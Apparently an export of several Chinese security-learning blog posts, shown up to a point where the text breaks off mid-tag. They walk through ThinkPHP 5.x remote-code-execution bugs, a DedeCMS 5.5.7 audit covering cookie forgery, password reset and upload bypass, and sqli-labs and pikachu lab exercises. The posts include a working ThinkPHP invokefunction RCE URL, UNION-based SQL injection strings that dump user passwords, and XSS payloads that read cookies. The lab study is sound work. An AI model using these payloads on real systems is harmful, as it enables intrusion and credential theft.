代码分析\n\n可以确定全部操作都是在第一行代码运行出的，首先进入input函数，经过调试在整个input函数中并没有对传入的get参数进行操作，只是将get.username拆分成了get和username，分别给了method和key，最后返回request的method\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305105555449.png\" alt=\"image-20240305105555449\" style=\"zoom:33%;\" />\n\n然后就会进入get函数，和前面一样，get函数将会获取get参数内容，并在最后调用input方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305105719139.png\" alt=\"image-20240305105719139\" style=\"zoom:33%;\" />\n\n在input函数中会对data进行强制类型转换，由于前面没有指定，因此转换的类型就是字符串形式，最后返回的data如下\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305105858355.png\" alt=\"image-20240305105858355\" style=\"zoom:33%;\" />\n\n接着进入set方法，看来主要就是下面的set方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305105949275.png\" alt=\"image-20240305105949275\" style=\"zoom:33%;\" />\n\n首先是init函数，对self进行初始化\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305110102282.png\" alt=\"image-20240305110102282\" style=\"zoom:33%;\" />\n\n然后是set函数，首先根据name获取要存入的文件的filename\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305110240895.png\" alt=\"image-20240305110240895\" style=\"zoom:33%;\" />\n\n如下是filename的具体生成过程\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305110335703.png\" alt=\"image-20240305110335703\" style=\"zoom:33%;\" />\n\n然后将value序列化给data，然后加上前后缀，就直接放入前面生成的filename所指定的文件，由于缺少内容过滤过程，因此很容易被写入恶意代码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305110435609.png\" alt=\"image-20240305110435609\" style=\"zoom:50%;\" />\n\n最终实验效果如下，由于开启了火绒，文件会被自动删除<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305110634120.png\" alt=\"image-20240305110634120\" style=\"zoom:33%;\" />\n\n##### 代码执行9\n\n###### 环境\n\nthinkphp5.1.30下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.1.30 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.6.0\",\n    \"topthink/framework\": \"5.1.30\"\n},\n```\n\n同目录下执行`composer update`\n\n###### payload\n\n```php\n~/public/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami\n```\n\n###### 代码分析\n\n首先明确 `index/\\think\\app/invokefunction` 是路径信息，pathinfo，指定了请求的处理逻辑，`call_user_func_array` 应该是请求的函数，vars是两个变量\n\n从此处的pathinfo函数进行分析，此处的var_pathinfo就是s，代表的是兼容参数，因此我们传入的第一个参数的值会被赋值给`$pathinfo`\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305164143503.png\" alt=\"image-20240305164143503\" style=\"zoom:33%;\" />\n\n接着进入path函数，去除了正常的url后缀，最后返回的path还是 `index/\\think\\app/invokefunction` \n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305164350845.png\" alt=\"image-20240305164350845\" style=\"zoom: 25%;\" />\n\n接着在routecheck函数中检查是否为强制路由模式\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305164506065.png\" alt=\"image-20240305164506065\" style=\"zoom:33%;\" />\n\n然后进入check方法，在此处又会对url进行检测，这里的url就是前面的path\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305164637464.png\" alt=\"image-20240305164637464\" style=\"zoom:33%;\" />\n\n在这个 `check` 方法中，首先会检测别名路由，然后检测 URL 绑定。如果检测到任何一个条件匹配成功，就会返回相应的结果。如果没有匹配到别名路由或者 URL 绑定，就会继续检测是否有设置了 `append` 或 `middleware` 选项，如果有的话，会进行相应的处理。在当前情况下以上条件都不满足，则会调用父类的 `check` 方法进行检测。\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305165021043.png\" alt=\"image-20240305165021043\" style=\"zoom: 33%;\" />\n\n最后返回的结果还是false，表示请求的URL不正确或者不在预期的范围内。\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305165316403.png\" alt=\"image-20240305165316403\" style=\"zoom:25%;\" />\n\n然后返回前面的check函数，在此处对must进行了判断，如果是强制路由就引发异常，在此处不是\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305165424324.png\" alt=\"image-20240305165424324\" style=\"zoom:33%;\" />\n\n然后进行url解析，此处的this->dispatch就是s的值\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305165605584.png\" alt=\"image-20240305165605584\" style=\"zoom:25%;\" />\n\n然后进入parseurlpath函数，返回的path和var的值如下所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305165810171.png\" alt=\"image-20240305165810171\" style=\"zoom:25%;\" />\n\n接着就是解析模块，在该模块中对控制器和运行函数都进行了解析\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305170010343.png\" alt=\"image-20240305170010343\" style=\"zoom:33%;\" />\n\n接着封装路由并返回\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305170107768.png\" alt=\"image-20240305170107768\" style=\"zoom:33%;\" />\n\n这个函数将会返回执行结果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305170449539.png\" alt=\"image-20240305170449539\" style=\"zoom:33%;\" />\n\n\n\n最后在dispatch函数中调用了call_user_func，将后面传入的两个参数分别作为命令和参数，因为在request里面制定了模块，控制器，方法，还有参数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305170643834.png\" alt=\"image-20240305170643834\" style=\"zoom:33%;\" />\n\n\n\n运行结果如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305170902184.png\" alt=\"image-20240305170902184\" style=\"zoom:33%;\" />\n\n##### 代码执行10\n\n###### 环境\n\nthinkphp5.0.23下载\n\n```shell\ncomposer create-project --prefer-dist topthink/think=5.0.23 tpdemo\n```\n\n修改composer.json文件\n\n```json\n\"require\": {\n    \"php\": \">=5.4.0\",\n    \"topthink/framework\": \"5.0.23\"\n},\n```\n\n同目录下执行`composer update`\n\n###### payload\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305214203124.png\" alt=\"image-20240305214203124\" style=\"zoom:33%;\" />\n\n###### 代码分析\n\n该实验主要的漏洞点在于此处的method方法不对post的数据进行过滤，用户可以构造成自己想执行的this的方法，此处采取构造成construct方法\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305213920337.png\" alt=\"image-20240305213920337\" style=\"zoom:33%;\" />\n\n然后接着就会调用construct方法，而construct方法就是对变量进行覆盖\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305214010427.png\" alt=\"image-20240305214010427\" style=\"zoom:33%;\" />\n\n这里我们主要是利用filtervalue函数中call_user_func方法，因此覆盖的就是filter和value\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305214102646.png\" alt=\"image-20240305214102646\" style=\"zoom:33%;\" />\n\n实验效果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A04/image-20240305214143722.png\" alt=\"image-20240305214143722\" style=\"zoom:33%;\" />\n\n","tags":["php"],"categories":["安全"]},{"title":"DedeCMS-5.5.7-sp2","url":"/post/2e50acad.html","content":"\n#### 代码审计第0篇之DedeCMS-5.5.7-sp2\n\n<!--more-->\n\n##### 目标一：登录admin账号\n\n###### step1: 注册新账号\n\n注册新账号查看代码执行过程，找到漏洞点\n\n如图所示，登录我们创建好的111用户，查看浏览器缓存的cookie信息\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227184229382.png\" alt=\"image-20240227184229382\" style=\"zoom:25%;\" />\n\n由此可知我们如果要登录admin账号，就要构造DedeUserID和DedeUserUserID__ckmd5的cookie值。\n\n同时观察到此处的我们新注册的账号userID为2，由此猜测admin账号的userID为1，但我们无法得知DedeUserID_ckMd5的值。\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227183837151.png\" alt=\"image-20240227183837151\" style=\"zoom:25%;\" />\n\n###### step2: 获取1的chMd5值\n\n查看index.php源码有关于cookie的存放\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227184358057.png\" alt=\"image-20240227184358057\" style=\"zoom:25%;\" />\n\n如图所示，在此处对uid的值是否为空进行了条件跳转，若uid为空直接检查是否为登录状态；若不为空，系统会先认为为登录态，再检查参数last_vid，若为空就将uid赋值给last_vid，然后将last_vid放入cookie\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227184758840.png\" alt=\"image-20240227184758840\" style=\"zoom:25%;\" />\n\n查看cookie函数的放置和检查函数，如图所示，此处的Putcookie我们可以猜测就是将原value和value__ckMd5的cookie存入\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227184850831.png\" alt=\"image-20240227184850831\" style=\"zoom:25%;\" />\n\n而Getcookie也就是检查这两个值\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227185010523.png\" alt=\"image-20240227185010523\" style=\"zoom:25%;\" />\n\n而上面我们分析到若uid不为空而lastvid为空我们就可以得到该uid的ckmd5值，因此此处我们将uid设为1，为lastvid设为空\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227185228742.png\" alt=\"image-20240227185228742\" style=\"zoom:25%;\" />\n\n此处的last_vid__ckmd5就是1的ckmd5值，因此我们设置uid和对应的ckmd5查看是否能成功登录，如图所示，登陆成功\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240227185341479.png\" alt=\"image-20240227185341479\" style=\"zoom:25%;\" />\n\n##### 目标二：修改任意目标用户密码\n\n###### step1:  分析修改密码代码\n\n首先确定修改密码的代码部分\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240301215949947.png\" alt=\"image-20240301215949947\" style=\"zoom:33%;\" />\n\n如图所示在修改密码之前对传入的的key的值进行了比较，现在查看row['pwd']是什么\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240301220100488.png\" alt=\"image-20240301220100488\" style=\"zoom:67%;\" />\n\nrow是__ pwd_tmp表中对应mid行的信息，也就是如果我们能获取我们要修改的id及其在 __pwd_tmp表中的pwd值则可对密码进行更新\n\n现在寻找在 __pwd_tmp表中添加pwd的代码，如下所示，首先随机生成了randval，然后对其散列，最后插入到表中，同时下面还进行了跳转，跳转的域名就包含着存在 __pwd_tmp中的密码，由此如果我们想办法进入到该函数则可以成功在__member修改密码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240301220644379.png\" alt=\"image-20240301220644379\" style=\"zoom:33%;\" />\n\n###### step2: 找到入口\n\n在sn函数中我们可以成功看到我们想要的函数\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240301221037425.png\" alt=\"image-20240301221037425\" style=\"zoom:33%;\" />\n\n而sn算法是在如下情况下使用\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240301221129441.png\" alt=\"image-20240301221129441\" style=\"zoom: 50%;\" />\n\n由此整个流程是 dopost=safequestion      - - ->       sn        - - - > newmail   - - - > 获取修改密码链接\n\n根据分析代码我们构造如下cookie（该攻击前提是要修改密码的用户没有设置安全问题，没有设置安全问题的情况下safequestion为0，safeanswer为空）：\n\n![image-20240301221433515](%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240301221433515.png)\n\n最后访问生成的链接\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240301221852927.png\" alt=\"image-20240301221852927\" style=\"zoom:33%;\" />\n\n##### 目标三： 一句话木马\n\n###### step1: 找到漏洞代码\n\n查找上传文件时可能发生的漏洞，在此处是对文件名进行的正则匹配，但是无法避免.jpg.php类型，以此看来该处为漏洞入口\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240302111546471.png\" alt=\"image-20240302111546471\" style=\"zoom:50%;\" />\n\n全局查找使用该文件的位置，最终锁定了dede/templets/article_add.htm文件内容中有使用该方法的位置，这里的selectImage函数就是用了上面的正则匹配方式上传文件\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240302163247013.png\" alt=\"image-20240302163247013\" style=\"zoom:33%;\" />\n\n根据该路径我们确定是管理员后端的增加文章界面，根据html文件内容我们确定了上传文件的地方\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240302163412969.png\" alt=\"image-20240302163412969\" style=\"zoom:33%;\" />\n\n通过本地上传文件之后可以看到上传后的路径\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240302163553791.png\" alt=\"image-20240302163553791\" style=\"zoom:33%;\" />\n\n###### step2: 使用burpsuite上传php文件\n\n找到漏洞入口就可以上传文件了，确定上传\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240302170257005.png\" alt=\"image-20240302170257005\" style=\"zoom:33%;\" />\n\n最后打开该文件\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A03/image-20240302170423090.png\" alt=\"image-20240302170423090\" style=\"zoom:33%;\" />\n\n可采用类似方式上传一句话木马文件掌握控制权\n","tags":["php"],"categories":["安全"]},{"title":"sqli-labs","url":"/post/b3432909.html","content":"\n## sqli-labs\n\n<!--more-->\n\n### Less-1\n\n如图所示通过burp抓包，首先判断是字符型还是数字型，如图所示，添加单引号并在后面and一个错误的表达式不会返回结果，说明是字符型注入\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A02/image-20231210144422416.png\" alt=\"image-20231210144422416\" style=\"zoom: 25%;\" />\n\n然后通过如下步骤确定列名，确定数据库名，找到表中的重要信息\n\n```sql\n确定字符型还是数字型：\nid=1%27%20and%201=2%23\n\n确定返回的数据列长度：\nid=1%27%20order%20by%203%23\n\n确定每个数字所在位置：\nid=-1%27%20union%20select%201,2,3%23\n\n确定表名：\nid=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()%23\n\n确定列名：\nid=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%23\n\n获取数据：\nid=-1%27%20union%20select%201,group_concat(username,'-',password),3%20from%20users%23\n\n```\n\n如图所示是最后的结果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A02/image-20231210145354335.png\" alt=\"image-20231210145354335\" style=\"zoom:33%;\" />\n\n### Less-2\n\n按照以下sql语句\n\n```sql\n确定是数字型：\nid=2%20and%201=2%23 \n\n获取列长度：\nid=2%20order%20by%203%23\n......\n\n获取数据\nid=-2%20union%20select%201,group_concat(username,'-',password),3%20from%20users%23\n```\n\n如图所示是最后的结果\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A02/image-20231210145743966.png\" alt=\"image-20231210145743966\" style=\"zoom:25%;\" />\n\n### Less-3\n\n该页面增加了重定向，直接在重定向界面进行发送包，sql语句如下\n\n```sql\n数字型发现没反应：\nid=1%20and%201=2%23 \n\n字符型报错：\nid=1%23%20and%201=2%23 \nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1\n\n猜测有括号，通过尝试确定该sql语句有括号需要闭合：\nid=1%27)%20and%201=2%23\n\n获取列长度：\nid=1%27)%20order%20by%203%23\n......\n\n获取用户信息：\nid=-1%27)%20union%20select%201,group_concat(username,'-',password),3%20from%20users%23\n\n```\n\n最后结果如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A02/image-20231210151338820.png\" alt=\"image-20231210151338820\" style=\"zoom:25%;\" />\n\n### Less-4\n\n","tags":["php"],"categories":["安全"]},{"title":"pikachu通关","url":"/post/7cfe8c25.html","content":"\n总耗时：两天\n\n<!--more-->\n\n常见漏洞学习：[PHP一些常见的漏洞梳理-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1697045)\n\n## pikachu通关\n\n### 暴力破解\n\n#### 基于表单的暴力破解\n\nlz随便试了下admin+123456就顺利通过了\n\n![image-20231207133307422](%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207133307422.png)\n\n#### 验证码绕过（On server）\n\n利用burpsuite抓包，通过测试发现看到多次repeat相同的vcode也可以，说明验证码不是一次性\n\n还是可以用上面基于表单的暴力破解方式\n\n#### 验证码绕过（On Client）\n\n由于是前端验证，所以只有在浏览器访问时验证码填错会有提示，导致用户密码无法传到后端\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207135044509.png\" alt=\"image-20231207135044509\" style=\"zoom:50%;\" />\n\n但是用repeater发送我们构造的请求包时省去了前端验证这一阶段，直接向后端发送数据，就算不用验证码也可以正确返回，如图所示，并不是验证码输入错误，或者没有输入\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207135214447.png\" alt=\"image-20231207135214447\" style=\"zoom:50%;\" />\n\n#### token防爆破\n\n同一个token发送两次效果如下\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207135501884.png\" alt=\"image-20231207135501884\" style=\"zoom: 25%;\" />\n\n通过分析网站源代码可以看到该token出现在前端html文件上，爆破时添加上该value值作为传递的token\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207140104370.png\" alt=\"image-20231207140104370\" style=\"zoom:25%;\" />\n\n顺便学习burp四种爆破方式\n\n1. Sinper（狙击手）\n\n    sinper使用一个字典，主要是将标记的数据进行逐个遍历替换\n爆破次数=标记字段数*字典字段数\n\n2. Battering ram（攻城槌）：\n\n    Battering ram使用一个字典，将包内所有标记的数据进行同时替换再发出，也就是每次爆破每个要爆破的地方的值都会是一样，因为是同时向后更新\n爆破次数=字典字段数量\n\n3. Pitchfork（干草叉）：\n\n    Pitchfork对每个标记字段单独设置字典，按照一一对应的关系取最少的组合，和Batter类似，但是会为每一个标记字段单独设置字典\n爆破次数=最少的字段字段数\n\n4. Cluster bomb（集束炸弹）：\n\n    Cluster bomb使用穷举法，对每个标记字段都遍历字典，和pitchFork一样为每一个标记字段单独设置字典，并用穷举更新而不是一起往后移动\n\n爆破次数=每个字典数量的乘积\n\n这里我采用Cluster bomb爆破方式，并选取三个标记点，通过测试发现集束炸弹不行，的用pitchFork才能正确匹配，可能是Grep - Extract可用于将响应中的有用信息提取到攻击结果表中。对于列表中配置的每个项，burp将添加一个新的results列，其中包含为该项提取的文本。但是由于该方式是进行穷举推荐，所以没办法进行一一匹配\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207142928283.png\" alt=\"image-20231207142928283\" style=\"zoom: 25%;\" />\n\n添加该字段作为token\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207143109087.png\" alt=\"image-20231207143109087\" style=\"zoom: 25%;\" />\n\n\n\nusername，password，token添加方式如下\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207143258768.png\" alt=\"image-20231207143258768\" style=\"zoom:25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207143317448.png\" alt=\"image-20231207143317448\" style=\"zoom:25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207143349561.png\" alt=\"image-20231207143349561\" style=\"zoom:25%;\" />\n\n如图所示，成功爆破\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207144353654.png\" alt=\"image-20231207144353654\" style=\"zoom: 25%;\" />\n\n### 跨站脚本攻击\n\n#### 反射型xss（get）\n\n通过测试发现输入有长度限制，应该是前端做了限制，通过查看源代码检查\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207144620852.png\" alt=\"image-20231207144620852\" style=\"zoom:33%;\" />\n\n传到burp的重放窗口即可\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207144956253.png\" alt=\"image-20231207144956253\" style=\"zoom: 25%;\" />\n\n将我们要传入的参数构造成url\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207145340312.png\" alt=\"image-20231207145340312\" style=\"zoom:33%;\" />\n\n#### 反射型xss（post）\n\n在构造语句上写上我们构造的xss漏洞即可，登陆之后会这样显示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207150023707.png\" alt=\"image-20231207150023707\" style=\"zoom: 33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207150036718.png\" alt=\"image-20231207150036718\" style=\"zoom: 33%;\" />\n\n#### 存储型xss\n\n留言什么下面就会显示什么，就将我们构造好的xss语句留言到下面，就会弹出cookie\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207150257560.png\" alt=\"image-20231207150257560\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207150225795.png\" alt=\"image-20231207150225795\" style=\"zoom:33%;\" />\n\n#### DOM型xss\n\n我们输入什么下面的what do you see会帮我们构造一个我们输入的内容的链接\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207150613426.png\" alt=\"image-20231207150613426\" style=\"zoom:33%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207150622126.png\" alt=\"image-20231207150622126\" style=\"zoom:33%;\" />\n\n查看前端逻辑，这儿是将text作为url，但是这里的str是有我们输入的，我们可以想办法使得该处能执行我们构造的xss恶意代码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207150801035.png\" alt=\"image-20231207150801035\" style=\"zoom:33%;\" />\n\n我们构造语句使得href闭合，并构造出了onclick的命令，使得点击该按钮会弹出cookie，效果如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207151232033.png\" alt=\"image-20231207151232033\" style=\"zoom:25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207151319448.png\" alt=\"image-20231207151319448\" style=\"zoom:33%;\" />\n\n#### DOM型xss-x\n\n一样的构造方式\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207151544599.png\" alt=\"image-20231207151544599\" style=\"zoom:33%;\" />\n\n#### xss之盲打\n\n插入xss登陆后台弹出了cookie（奇奇怪怪）\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207152227212.png\" alt=\"image-20231207152227212\" style=\"zoom: 25%;\" />\n\n#### xss之过滤\n\n如图所示，明显的过滤掉了后面的所有内容\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207152449174.png\" alt=\"image-20231207152449174\" style=\"zoom:25%;\" />\n\n通过多次测试发现`<script>`被过滤掉了，搜索之后发现了\n\n##### 绕过 `<SCRIPT>`过滤\n\n有些过滤器会过滤到`<script>`标签，那上面的例子就都废了，但是还是有方法插入 javascript 的。我 们看看事件处理器的例子。\n\n```\n<BODY onload=\"alert('XSS')\"> \n```\n\n在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是 有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了\n\n如图所示，再次成功获取到cookie\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207153052193.png\" alt=\"image-20231207153052193\" style=\"zoom:25%;\" />\n\n#### xss之htmlspecialchars\n\n如图所示，我们输入的内容会被放入href中，所以采取的方式是将href进行闭合然后增加onclick函数功能执行xss恶意代码，构造效果如下图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207153809546.png\" alt=\"image-20231207153809546\" style=\"zoom: 25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207153949758.png\" alt=\"image-20231207153949758\" style=\"zoom:25%;\" />\n\n同样的构造方式发现单引号没办法使href闭合\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207154126687.png\" alt=\"image-20231207154126687\" style=\"zoom:25%;\" />\n\n这里通过学习发现要用js伪协议\n\n##### JavaScript伪协议是什么？\n\n伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，\n\n而是为关联应用程序而使用的.如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript:\n\n我们可以在浏览地址栏里输入\"javascript:alert(‘JS!’);\"，点转到后会发现，实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。\n\n通俗地讲，JavaScript伪协议不是真实存在的协议，它的功能是将JavaScript：后面的语句当做JavaScript代码在本页面执行，并不跳转到其他网页，而是结果返回给当前页面，相当于一个伪造的超链接，它经常与a标签一起使用，如：\n\n```\n<a href=javascript:alert(/xss/) > 点击我</a>\n```\n\n功能是在当前页面弹出一个弹窗\n\n如图所示，通过构造javascript伪协议成功获取了cookie\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207154931831.png\" alt=\"image-20231207154931831\" style=\"zoom:25%;\" />\n\n#### xss之js输出\n\n查看源代码发现我们输入的内容直接就在前端的script里面，所以我们只需要添加好我们要构造的xss之后闭合，构造内容为\n\n```\nnba';alert(document.cookie);$ms='tmac\n```\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207155513682.png\" alt=\"image-20231207155513682\" style=\"zoom: 25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207155706434.png\" alt=\"image-20231207155706434\" style=\"zoom: 40%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207155417236.png\" alt=\"image-20231207155417236\" style=\"zoom: 25%;\" />\n\n#### XSS防范\n\n**输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;**\n\n**输出转义：根据输出点的位置对输出到前端的内容进行适当转义;**\n\n### CRSF\n\n#### CRSF(get)\n\n将修改个人信息的请求包通过burpsuite生成POC（一个HTML页面），就是这个html相当于已经将所有修改的信息已经构造好了，只需要用户点击按钮就可以了，如下图所示是生成的html代码\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207190431681.png\" alt=\"image-20231207190431681\" style=\"zoom:33%;\" />\n\n按理说要将这个文件上传看到效果，但是该任务没有上传文件的接口，所以我尝试将构造的html放在源码中，如下图更改成功了\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207190951656.png\" alt=\"image-20231207190951656\" style=\"zoom:25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207191022383.png\" alt=\"image-20231207191022383\" style=\"zoom:25%;\" />\n\n#### CRSF(post)\n\n一样的方式构造，如图所示\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207191553418.png\" alt=\"image-20231207191553418\" style=\"zoom: 25%;\" /><img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231207191727734.png\" alt=\"image-20231207191727734\" style=\"zoom:25%;\" />\n\n#### CRSF(Token)\n\n还是先用burpsuite抓包，可以看到这次虽然还是get的请求包但是请求头的参数多了token\n\n<img src=\"%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A01/image-20231208082955540.png\" alt=\"image-20231208082955540\" style=\"zoom: 33%;\" 